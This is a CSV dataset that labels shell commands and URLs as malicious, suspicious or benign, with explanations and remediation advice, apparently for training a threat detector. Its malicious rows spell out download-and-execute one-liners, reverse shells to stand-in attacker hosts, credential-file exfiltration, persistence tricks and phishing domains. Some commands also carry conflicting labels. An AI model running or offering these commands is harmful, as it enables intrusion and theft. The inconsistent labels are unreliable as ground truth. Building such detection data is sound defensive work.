Prompt,Label,Explanation,Recommendation
Invoke-WebRequest -Uri http://badserver.com/mal.ps1 -OutFile mal.ps1; ./mal.ps1,Malicious,Downloads and executes a PowerShell script from a suspicious domain.,Check script content and remove it; disable Invoke-WebRequest if unnecessary.
"schtasks /create /tn ""Update"" /tr ""C:\mal.exe"" /sc minute /mo 5",Malicious,Schedules a task to execute a suspicious executable repeatedly.,Remove the task and investigate 'mal.exe' for malicious behavior.
ftp -n -v attacker.com < script.txt,Malicious,Automated FTP session could be used to exfiltrate data.,Block outbound FTP and analyze 'script.txt'.
python -m http.server 8080,Malicious,May be used to serve payloads or stolen data over HTTP.,Check what is being served and block unauthorized web servers.
echo evil >> ~/.bashrc,Malicious,Appends malicious code to bash startup file for persistence.,Review .bashrc and remove unauthorized entries.
"(New-Object Net.WebClient).DownloadFile('http://attackserver.com/shell.exe','shell.exe')",Malicious,Downloads a binary file which could be malware.,Delete the file and block the attacker's domain.
curl http://example.com,Suspicious,Curl command to access an external site without explanation.,Check if the domain is trusted and restrict if unnecessary.
whoami,Suspicious,"Benign by itself, but could indicate recon if followed by other commands.",Correlate with other actions before labeling as malicious.
ping 8.8.8.8,Suspicious,"Network reachability test, might be part of a larger script.",Monitor for patterns of abuse or data exfiltration.
netstat -ano,Suspicious,"Checks active network connections, often used during reconnaissance.",Audit process behavior and correlate with unusual traffic.
dir C:\,Suspicious,"Lists root directory contents, could be probing file structure.",Track frequency and context of use.
set,Suspicious,"Reveals all environment variables, sometimes used for credential hunting.",Review for sensitive tokens or secrets exposure.
ls -la /etc/,Suspicious,Listing sensitive configuration directories; may indicate reconnaissance.,Audit user activity and limit shell access.
tasklist,Suspicious,"Retrieves all running processes, often used for discovery by attackers.",Log process usage and alert on suspicious enumeration.
Get-Process,Suspicious,"PowerShell variant to list processes, common in recon scripts.",Allow but monitor frequency across systems.
"curl -X POST -d ""data=test"" http://unknown.io/api",Suspicious,Sends POST data to an unfamiliar domain.,Review the domain and inspect data exfiltration possibility.
nc -zv 192.168.1.1 1-1000,Suspicious,Performs a port scan; could be an internal threat or misconfiguration.,Restrict port scanning tools and alert on similar patterns.
find / -name '*.pem',Suspicious,Searches for private keys on the file system.,Alert and verify access permissions on sensitive files.
crontab -l,Suspicious,Lists scheduled tasks; used in recon or privilege escalation.,Review crontab entries for anomalies.
ps aux | grep root,Suspicious,Checks processes running as root; potential enumeration.,Investigate user intent and system behavior.
Get-WmiObject Win32_UserAccount,Suspicious,Retrieves user accounts; might be part of privilege escalation.,Audit the execution and check user context.
cat /etc/shadow,Suspicious,Accessing hashed passwords is typically unauthorized.,Alert and investigate potential privilege escalation.
ls -l /home/user,Benign,Standard command to list files with details in a directory.,No action required.
cd /var/log,Benign,"Changes directory to access system logs, a routine task.",No action necessary.
python3 script.py,Benign,Runs a local Python script; typical in development workflows.,Ensure the script is safe and monitored.
git clone https://github.com/user/repo.git,Benign,Clones a GitHub repository; common developer action.,No concern unless from an untrusted source.
mkdir new_folder,Benign,Creates a new directory; benign system operation.,No action needed.
echo 'Hello World',Benign,Outputs a simple string; often used for testing or scripting.,No action required.
ping localhost,Benign,Tests local network stack; commonly used for diagnostics.,No concern.
Get-Help Get-Process,Benign,Requests help documentation for a PowerShell command.,Safe and useful for users learning commands.
date,Benign,Displays the current date and time.,No action needed.
ipconfig,Benign,Displays network configuration; useful for troubleshooting.,Allowed by most system policies.
man ls,Benign,Displays manual page for 'ls' command.,Benign activity.
sudo apt update,Benign,Updates package list on a Linux system; typical maintenance.,No action necessary.
hostname,Benign,Returns the system hostname; standard usage.,No action needed.
whoami,Benign,Displays current user; helpful for scripting and user checks.,No issue.
systeminfo,Benign,Retrieves system information for troubleshooting.,Benign unless combined with other suspicious behavior.
pwd,Benign,Displays current working directory.,No concern.
clear,Benign,Clears the terminal screen.,Safe to use.
curl http://data-stealer.biz/steal.sh | sh,Malicious,Downloads a data-exfiltration script from a suspicious source.,"Block the domain, investigate system logs for outgoing connections."
wget http://hackerportal.org/trojan.exe -O trojan.exe && ./trojan.exe,Malicious,Downloads and executes a known trojan executable.,Quarantine the file and review system activity.
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://maliciousupdate.co/fakeupdate.ps1'),Malicious,Runs PowerShell to fetch remote code without validation.,Block outbound PowerShell traffic and isolate the machine.
certutil -urlcache -split -f http://phishing.site/payload.bin bad.exe,Malicious,Abuses certutil to download an executable payload.,Alert on similar certutil usage and remove bad.exe.
http://update-vpn-settings.net,Malicious,Spoofed phishing URL attempting to mimic VPN update service.,Warn users and block the URL at the proxy.
http://microsoft-verification.site/login,Malicious,Phishing page impersonating Microsoft login.,Blackhole the domain and inform targeted users.
powershell.exe -EncodedCommand aGVsbG8gd29ybGQ=,Malicious,Encoded PowerShell command may hide obfuscated code.,Decode and analyze the payload before allowing.
"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ /d ""badscript.exe""",Malicious,Creates registry persistence with suspicious executable.,Delete registry entry and block 'badscript.exe'.
bash -i >& /dev/tcp/evilhost.com/1337 0>&1,Malicious,Reverse shell using bash and TCP redirection.,Trace back IP and terminate connections.
http://login.dropbox-checker.com,Malicious,Fake Dropbox login page used for credential harvesting.,Block the domain and reset any compromised accounts.
cmd.exe /c bitsadmin /transfer evil http://malicious.io/evil.exe C:\temp\evil.exe,Malicious,Abuses BITS to download and store malware silently.,Disable bitsadmin tool in policy.
mshta http://fakepopup.com/alert.hta,Malicious,Executes a malicious HTA script via mshta.,Block HTA files and monitor mshta usage.
http://secure-bank-login.net,Malicious,Spoofs a financial institution for phishing credentials.,Blacklist and report the phishing site.
nc attacker.net 4444 -e /bin/sh,Malicious,Netcat reverse shell connecting to remote attacker.,Kill session and restrict netcat usage.
http://login-confirm-gmail.com,Malicious,Impersonates Google login page to steal credentials.,Notify users and block domain.
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).DownloadString('http://payloads.evil/runme.ps1') },Malicious,Remote execution of malicious PowerShell script.,Prevent remote execution policies in org settings.
ftp ftp.badactor.com,Malicious,Connects to unauthorized FTP potentially used for exfiltration.,Restrict FTP access unless explicitly needed.
http://winupdate-service.net/install,Malicious,Spoofs legitimate Windows update to distribute malware.,Immediately quarantine endpoints accessing it.
"python3 -c 'import socket,subprocess,os;...'",Malicious,Python one-liner reverse shell often used in payloads.,Trace execution context and block attacker IP.
http://onedrive-share.cloud/auth,Malicious,Masquerades as OneDrive to lure credentials.,Blacklist domain and educate users on phishing indicators.
curl -s http://badcdn.net/jsloader.js | node,Malicious,Downloads JavaScript and executes with Node.js.,Restrict node to signed scripts.
curl http://192.168.2.50/evil.jpg | bash,Malicious,Downloads 'image' likely hiding a script for execution.,Flag file mismatch and terminate process.
powershell -exec bypass -File ransomware.ps1,Malicious,Executes potentially destructive ransomware script.,Disconnect host and recover from backups.
http://update-adobe-service.com/install_flash,Malicious,Mimics Adobe Flash update to install malware.,Revoke access and block URL.
http://auth-icloud-login.net,Malicious,Phishing page targeting Apple IDs.,Reset affected credentials and block domain.
scp user@192.168.100.2:/tmp/rootkit /usr/local/bin/,Malicious,Transfers a possible rootkit via SCP.,Reimage system and rotate credentials.
http://secure-sso-check.org,Malicious,Fake SSO login often used for phishing.,Block traffic and alert users.
Get-Content secrets.txt | Invoke-WebRequest -Uri http://leak.me/upload -Method POST,Malicious,Leaking sensitive file contents to attacker-controlled site.,Alert and inspect other outbound exfiltration attempts.
http://githubusercontent.download/mal.js,Malicious,Malicious script hosted on spoofed GitHub domain.,Block fake mirrors and confirm source.
echo 'cmd.exe' >> startup.bat,Malicious,Modifies startup script to include shell execution.,Revert startup modifications.
http://support.microsoft-win.net,Malicious,Phishing site mimicking Microsoft support.,Blacklist and monitor DNS logs.
wget http://haxx0r.biz/payload -O - | bash,Malicious,Downloads unknown binary and pipes to shell.,Disable auto-pipe commands in shell configs.
smbclient \\192.168.56.101\share -U eviluser,Malicious,Accessing internal share with suspicious user.,Audit SMB share permissions.
http://webclient-updates.com,Malicious,Another phishing domain impersonating web apps.,Add to threat intelligence feed.
curl http://backconnect.cc/payload | bash,Malicious,Backconnect shell installer from known C2.,Blacklist and trace download origin.
echo 'powershell malware.ps1' >> login.bat,Malicious,Injects malicious script into login batch file.,Check user logon scripts.
http://vpn-verification.net/login,Malicious,Fake VPN login designed to steal enterprise credentials.,Block domain and alert IT security.
curl http://unknowncdn.com/resource.js,Suspicious,Accesses an unfamiliar domain to retrieve scripts.,Verify domain reputation.
ping google.com,Suspicious,May be used for connectivity test or to script connectivity logic.,Context needed to assess legitimacy.
nc -vz 10.0.0.2 1-1024,Suspicious,Scanning open ports; often used in recon.,Restrict outbound scanning behavior.
cat ~/.aws/credentials,Suspicious,Reads sensitive credentials file; depends on user context.,Check access logs and rotate keys.
ls -la /etc/ssh,Suspicious,Listing sensitive SSH config directory.,Review file access permissions.
whoami && hostname,Suspicious,Combined command used to confirm user and host; may be normal or suspicious.,Correlate with execution source.
echo 'test' > /tmp/debug,Suspicious,Writing to a temp file; depends on context.,Ensure temp files are used appropriately.
powershell Get-ChildItem -Recurse,Suspicious,Recursive listing of files; might be used in file discovery.,Monitor for excessive enumeration.
http://192.168.100.10:8080/api/receive,Suspicious,Custom IP-based HTTP endpoint; requires validation.,Check for potential data exfiltration.
ipconfig /all,Suspicious,Gathering detailed network config.,Allowed if legitimate admin; otherwise flag.
netstat -anob,Suspicious,Examines all network connections and associated binaries.,Audit process creating connections.
ssh user@10.10.10.10,Suspicious,SSH connection to internal host; check legitimacy.,Alert on unusual SSH traffic.
python3 -m http.server 8000,Suspicious,Spins up HTTP server; could serve data for exfil.,Monitor use of dev servers.
find / -name '*.log',Suspicious,Searching for logs system-wide.,Verify if used for troubleshooting or abuse.
Get-ADUser -Filter *,Suspicious,Enumerates all AD users via PowerShell.,Verify privileges and intent.
Get-Command *,Suspicious,Lists all available PowerShell commands.,Check user role and command origin.
lsattr -a,Suspicious,Lists file attributes; used in forensic review or hiding files.,Verify script or tool context.
scp /etc/shadow user@10.0.0.3:/tmp/,Suspicious,Suspicious attempt to copy sensitive password hashes.,Alert and inspect the target machine.
http://devtoolkit.cloud/callback,Suspicious,Custom endpoint not on approved domain list.,Check app behavior and allow only trusted domains.
curl -k https://unknowncert.com/data,Suspicious,Forces ignore of certificate check on HTTPS site.,Block curl usage without cert validation.
telnet 172.16.0.1 25,Suspicious,Legacy tool used to manually probe SMTP port.,Restrict telnet access.
Get-EventLog -LogName Security,Suspicious,Retrieves security log; can be used for covering tracks.,Check user authorization.
bash -c 'ls /root',Suspicious,Running commands as root; investigate privilege escalation.,Alert and review user privileges.
http://internal-api.test.local/health,Suspicious,May be part of a legit microservice but check referrer.,Restrict internal API access.
Get-Credential,Suspicious,Prompts for credentials in script; may be for misuse.,Audit script source.
cat /proc/version,Suspicious,Check kernel version; often used in vuln detection.,Monitor frequency.
wget --no-check-certificate https://badssl.com,Suspicious,"Bypasses cert validation, which is risky.",Enforce certificate checks.
ftp ftp.suspicious.org,Suspicious,Unencrypted data transfer to unfamiliar host.,Block FTP unless whitelisted.
sudo -l,Suspicious,Checks sudo permissions; common in privilege enumeration.,Alert if from low-privilege users.
http://iot-control-device.local/config,Suspicious,IOT local device configuration access.,Review device IP and firmware.
dir /s /b C:\,Suspicious,Lists all files on C: drive recursively; can be suspicious.,Audit command usage.
http://customendpoint.net/post,Suspicious,Unrecognized HTTP POST endpoint.,Validate if it's a sanctioned service.
cat /etc/hosts,Suspicious,"View of hostname-IP mapping; usually safe, context-dependent.",Check for tampering.
ls -la /var/www,Suspicious,Access to web directory; could be audit or prep for defacement.,Inspect web file permissions.
ls -lh,Benign,Lists files with sizes and human-readable format.,No action needed.
echo Hello World,Benign,Prints a simple message to console.,No concern.
cd /var/log,Benign,Changes directory to system logs.,No action required.
ping localhost,Benign,Checks local network stack.,Safe command.
ifconfig,Benign,Displays network interfaces (Linux).,Benign usage.
Get-Process,Benign,Lists all processes in PowerShell.,Legitimate system admin activity.
mkdir reports,Benign,Creates a new directory.,No issue.
hostname,Benign,Displays machine name.,Normal system interaction.
date,Benign,Displays current system date.,Benign.
man curl,Benign,Reads manual page for curl command.,No concern.
top,Benign,Shows system resource usage.,Legitimate tool use.
tasklist,Benign,Displays running tasks on Windows.,Benign unless excessive.
whoami,Benign,Returns current user ID.,Normal command.
systeminfo,Benign,Provides Windows system specs.,Used for basic diagnostics.
sudo apt update,Benign,Updates package index in Ubuntu.,Normal maintenance.
git pull,Benign,Updates local repository from remote.,Expected in dev environments.
cat /etc/os-release,Benign,Displays OS version info.,Routine diagnostics.
Get-Date,Benign,PowerShell to display date.,Benign use.
ps -aux,Benign,Lists running Linux processes.,Normal operation.
npm install,Benign,Installs packages for JavaScript project.,Standard dev action.
brew update,Benign,Homebrew command to update formulas.,Expected system upkeep.
pip install requests,Benign,Installs Python library.,Normal for developers.
lsblk,Benign,Lists block devices.,Safe unless abused.
clear,Benign,Clears terminal screen.,No risk.
df -h,Benign,Shows disk usage.,Typical admin tool.
python3 my_script.py,Benign,Runs a user script.,Safe depending on context.
Get-Help Get-Command,Benign,Requests help in PowerShell.,No action needed.
uptime,Benign,Checks system load time.,Benign command.
ls /tmp,Benign,Lists temporary directory files.,Common task.
echo $PATH,Benign,Displays environment PATH variable.,Safe use.
touch testfile.txt,Benign,Creates an empty text file.,No concern.
Get-ChildItem,Benign,Lists directory content in PowerShell.,Benign.
cd ~/projects,Benign,Navigates to user projects folder.,No action needed.
curl http://evilpayloads.cc/inject.sh | bash,Malicious,Fetches and executes a shell script from a known malicious domain.,"Terminate execution, block domain, and scan system."
wget http://ransom-node.net/encryptor.py -O /tmp/encryptor.py && python3 /tmp/encryptor.py,Malicious,Downloads ransomware script for execution.,"Quarantine system, inspect encrypted files, and restore from backups."
powershell -enc SQBFAFgAcAAgAC0AbgBwACAAaAB0AHQAcAA6AC8ALwBtAGkAcwBoAGEAcgBkAC4AYwBvAG0ALwBwAHkALgBzAHEA,Malicious,Obfuscated PowerShell likely hiding malicious intent.,Decode and inspect the script before allowing.
http://fake-google-auth.net,Malicious,Spoofed Google login phishing URL.,Blackhole domain and notify potentially affected users.
bash -i >& /dev/tcp/malnode.io/9090 0>&1,Malicious,Establishes reverse shell connection to remote host.,"Block IP, terminate session, and isolate machine."
certutil -f -urlcache -split http://badupdates.site/toolkit.exe toolkit.exe,Malicious,Leverages certutil to drop suspicious executable.,Delete file and block domain.
http://drive-access-login.info,Malicious,Phishing link posing as Google Drive access page.,Warn users and prevent access through email filters.
scp attacker@evilhost:/var/data/malware /usr/bin,Malicious,Transfers and stores malware to system directory.,Audit all file transfers and inspect 'malware'.
echo 'bash -i >& /dev/tcp/10.10.0.1/9001 0>&1' >> ~/.bashrc,Malicious,Adds reverse shell to shell initialization file.,Delete script line and scan for persistence.
"python3 -c 'import os; os.system(""curl http://cnc.botnet.biz/sh"")'",Malicious,Uses Python to fetch and execute remote shell script.,Disable remote command execution and check outbound logs.
Invoke-WebRequest -Uri http://loadremote.com/evil.ps1 -OutFile evil.ps1; ./evil.ps1,Malicious,Downloads and executes a PowerShell script.,Isolate system and examine script content.
"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Ransom /t REG_SZ /d ""C:\malware.exe""",Malicious,Persists ransomware binary through registry autorun.,Remove autorun key and inspect malware.exe.
nc -e cmd.exe attacker.com 9999,Malicious,Reverse shell from Windows to attacker server.,Kill shell process and restrict outgoing ports.
http://microsoft-reset-password.net,Malicious,Impersonates Microsoft to capture passwords.,Blacklist domain and notify affected parties.
curl -s http://botnets.infected/api | bash,Malicious,Silent download and execution of botnet payload.,Trace process and firewall C2 endpoint.
echo 'powershell iex(iwr http://bad.ps1)' >> startup.ps1,Malicious,Modifies startup to include malicious PowerShell command.,Remove command and validate registry or autorun paths.
ftp -n -s:ftp_upload_script.txt attacker.site,Malicious,Automated FTP upload to malicious server.,Block unauthorized FTP transfers.
http://adobe-flash-fakeupdate.org,Malicious,Phishing page disguised as Adobe Flash updater.,Prevent access and scan system for fake installers.
wget http://injectthis.com/script.sh -O - | bash,Malicious,Pipe unknown remote script directly to shell.,Disable auto-pipe execution logic in scripts.
http://icloud-authentic-login.org,Malicious,Phishing site for Apple account credentials.,Blacklist site and rotate exposed credentials.
Get-Content creds.txt | curl -d @- http://exfiltrate.me,Malicious,Attempts to send credential file contents to an external server.,Monitor for other leaks and alert security team.
"(New-Object Net.WebClient).DownloadFile('http://hackerhub.com/file.exe','C:\temp\file.exe')",Malicious,Downloads unknown executable using PowerShell.,Analyze binary and restrict outbound scripts.
schtasks /create /tn Backdoor /tr 'C:\hidden\bd.exe' /sc minute /mo 1,Malicious,Creates frequent task running hidden binary.,Disable task and inspect bd.exe.
cmd /c reg import C:\ransom.reg,Malicious,Imports registry entries likely tied to ransomware.,Inspect the .reg file for harmful modifications.
http://githubsecurity-checks.net,Malicious,Fake GitHub page for phishing or malware delivery.,Block domain and educate developers.
Set-MpPreference -ExclusionPath 'C:\Users\Public\',Malicious,Disables AV scanning on public folder to hide payloads.,Revert exclusions and scan target directory.
echo 'curl http://evilscript.sh | bash' >> ~/.bash_profile,Malicious,Persists malicious download in user profile.,Remove line and verify shell integrity.
scp evil.sh user@remotehost:/etc/init.d/,Malicious,Deploys potentially malicious script into init directory.,Validate remote system and remove script.
http://support-microsoft-auth.net,Malicious,Spoofs Microsoft technical support login.,Prevent access via DNS sinkhole.
wget -q http://badsite.org/injector && bash injector,Malicious,Quietly fetches and runs an unknown injector file.,Review download history and terminate processes.
curl http://backup-breach.me/extract.sh | bash,Malicious,Fetches extraction script likely exfiltrating data.,Alert SOC and block remote access.
echo 'mshta http://roguesite.com/script.hta' >> login.bat,Malicious,Injects rogue HTA execution into login script.,Clean login.bat and monitor for persistence.
http://sso-login-dropbox.net,Malicious,Phishing portal mimicking Dropbox SSO login.,Blacklist and trace access attempts.
http://securelogin-authenticator.net,Malicious,Spoofed SSO portal used for credential theft.,Educate users and block domain.
"powershell -command ""IEX((New-Object Net.WebClient).DownloadString('http://hijack.com/start.ps1'))""",Malicious,Runs hijacked script via PowerShell.,Investigate script and restrict dynamic loading.
netstat -an,Suspicious,Monitors all network connections; may be used for scanning or troubleshooting.,Audit user running the command.
ls -laR /,Suspicious,Recursively lists all files; often used in recon or large file collection.,Track and evaluate frequency.
powershell Get-Service,Suspicious,Enumerates services; contextually safe or suspicious.,Monitor and correlate with session logs.
Get-WmiObject Win32_Process,Suspicious,Used to enumerate processes on remote/local systems.,Confirm admin purpose.
whoami && net user,Suspicious,Checks user identity and enumerates users; may be part of enumeration.,Review script source.
curl -X GET http://untrusted.api.io/data,Suspicious,Makes a request to an unfamiliar endpoint.,Validate endpoint domain.
ftp ftp.unknownhost.com,Suspicious,Unsecured file transfer to unknown host.,Limit access to trusted FTP destinations.
python3 -m http.server 8088,Suspicious,Creates temporary server; needs validation.,Allow only in trusted environments.
sudo -i,Suspicious,Switch to root shell; may be expected or suspicious.,Confirm activity legitimacy.
Get-EventLog -LogName Application -Newest 50,Suspicious,Retrieves latest application logs.,Review usage frequency.
http://192.168.88.3:9000/ping,Suspicious,Internal endpoint ping request; review referrer.,Ensure endpoint is intended for service checks.
cat ~/.bash_history,Suspicious,Reads user's shell history; often done for intel gathering.,Restrict access to history.
find / -perm -4000,Suspicious,Searches for SUID binaries; often used in privilege escalation.,Log and alert if unnecessary.
net use \\192.168.1.100\C$ /user:admin,Suspicious,Access to administrative shares on remote system.,Audit credentials and source.
cat /var/log/auth.log,Suspicious,Reviews auth logs; can be benign or abused.,Audit user access.
ssh root@192.168.0.5,Suspicious,Remote access as root; risky if not authorized.,Alert if out of policy.
ps -ef | grep sshd,Suspicious,Checks for SSH sessions; context-specific.,Evaluate command sequence.
lsattr /etc/passwd,Suspicious,Checks file attributes of critical files.,Check for signs of tampering.
http://debug.local/testapi,Suspicious,Local API endpoint access; validate use.,Whitelist internal domains.
uname -a,Suspicious,Gathers kernel and system info.,Correlate with script origin.
env,Suspicious,Lists all environment variables; used in scripting and info collection.,No immediate action.
df -Th,Suspicious,Disk usage and filesystem type; benign unless scripted.,Confirm normal admin task.
ls -ld /root,Suspicious,Checks root directory access; could be exploratory.,Audit user privileges.
http://iot-ping.local/status,Suspicious,Checks status of internal IoT service.,Restrict access to authorized services.
Get-HotFix,Suspicious,Gets Windows hotfix information; depends on context.,Cross-reference with patching schedule.
dir /A:D /S,Suspicious,Lists all directories recursively in Windows.,Track script behavior.
Get-NetIPAddress,Suspicious,Retrieves all IP configs; used in recon or networking tasks.,Validate system role.
wget https://privateapi.cloud,Suspicious,Requests data from unknown cloud endpoint.,Inspect domain and headers.
Get-LocalGroupMember -Group Administrators,Suspicious,Checks members of admin group; can indicate escalation checks.,Log query origin.
net accounts,Suspicious,Shows password policies and account info.,Review logs for access context.
id,Suspicious,Returns user and group IDs; typically safe unless scripted.,No immediate risk.
ip a,Suspicious,Shows network interfaces; safe or suspicious depending on script usage.,Evaluate frequency of execution.
ls -lh /var,Benign,Lists files in /var with human-readable format.,Normal usage.
echo 'Update complete',Benign,Prints message to terminal.,No concern.
cd ~/Documents,Benign,Changes directory to user documents.,Benign.
Get-ChildItem -Path C:\Users,Benign,Lists user directories on Windows.,Safe.
ping 8.8.4.4,Benign,Tests Google DNS reachability.,Standard diagnostic.
hostnamectl,Benign,Displays hostname and OS details.,Benign.
sudo systemctl restart apache2,Benign,Restarts Apache web server.,Legitimate admin task.
clear,Benign,Clears terminal screen.,Safe.
date,Benign,Displays system date and time.,Benign.
df -h,Benign,Shows disk usage.,No action needed.
npm start,Benign,Starts Node.js application.,Expected in dev environments.
python3 manage.py runserver,Benign,Launches Django development server.,Benign.
top,Benign,Real-time system monitoring.,Safe.
htop,Benign,Interactive process viewer.,Benign.
brew upgrade,Benign,Upgrades packages on macOS.,No concern.
git push origin main,Benign,Pushes code to repository.,Developer workflow.
cat README.md,Benign,Views project README file.,Benign.
tail -f /var/log/syslog,Benign,Monitors system log in real time.,Admin activity.
whoami,Benign,Returns current user.,Safe.
systeminfo,Benign,Returns system specs.,Benign.
Get-Command,Benign,Lists all available PowerShell commands.,Normal usage.
cd /etc,Benign,Navigates to system configuration directory.,No issue.
echo $USER,Benign,Displays current user variable.,Safe.
lsusb,Benign,Lists connected USB devices.,Diagnostic purpose.
uname -r,Benign,Displays kernel version.,Benign.
git status,Benign,Shows current Git repo status.,Developer tool.
pip list,Benign,Lists installed Python packages.,Normal.
mkdir backup,Benign,Creates a new folder named 'backup'.,No concern.
Get-Date,Benign,Returns current date and time in PowerShell.,Benign.
cat /etc/hostname,Benign,Displays system hostname file.,Safe.
cd ~/Downloads,Benign,Navigates to downloads folder.,No concern.
uptime,Benign,Displays system uptime.,Benign.
ls /dev,Benign,Lists device files in /dev directory.,Expected command.
ip link show,Benign,Displays interface status.,Safe.
potterholden.com/,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
tabs.ultimate-guitar.com/e/europe/prisoners_in_paradise_guitar_pro.htm,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
lasalle.nsw.edu.au/,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
onlineradio2.com/listen/Radio-Classique_Montreal_995,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
http://pornsharing.com/bubble-butt-exotic-latina-sophia-fiore-gives-it-to-black-man_v79150,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
tinderbox-web.com/find/find_people.htm,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
yakutia.org/index.php?option=com_content&task=view&id=35&Itemid=9,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
mylife.com/colleges/ne/lincoln/nebraska-wesleyan-university/,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
tvrage.com/person/id-37708/John+Simm,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
dirt.asla.org/2011/01/12/interview-with-tim-duggan-make-it-right-foundation/,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
legacy.com/obituaries/baltimoresun/obituary.aspx?n=andrew-e-gorsuch&pid=150800194&fhid=4091,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
smithstearns.com/,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
http://szgs.ru/news/news-in-the-world-of-the-gas/37-2008-11-27-05-51-11.html,Malicious,"Website shows signs of being defaced, likely due to a previous breach.",Alert web administrator and assess for unauthorized changes or backdoors.
pokrokus.eu,Malicious,Phishing site designed to trick users into entering sensitive credentials.,"Block the domain, warn users, and check for compromised accounts."
http://tobogo.net/cdsb/board.php?board=mylife&bm=view&no=454&category=&auth=&page=1&search=&keyword=&recom=,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
liveleak.com/view?i=5a1_1186059710,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
photography-on-the.net/forum/showthread.php?t=167083,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
linkedin.com/pub/dante-henderson/0/821/208,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
http://kickass.to/community/show/number-game-v3-join-months-challenge/?post=16466622,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
http://www.allaroundrental.com/index.php?page=shop.product_details&category_id=27&flypage=flypage.pbv.v1.tpl&product_id=276&option=com_virtuemart&Itemid=63,Malicious,"Website shows signs of being defaced, likely due to a previous breach.",Alert web administrator and assess for unauthorized changes or backdoors.
videosurf.com/videos/viana+do+castelo?providers=2,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
timesleader.com/business/Beacon_Power_pursuing_Hazle_Twp__plant_11-05-2011.html,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
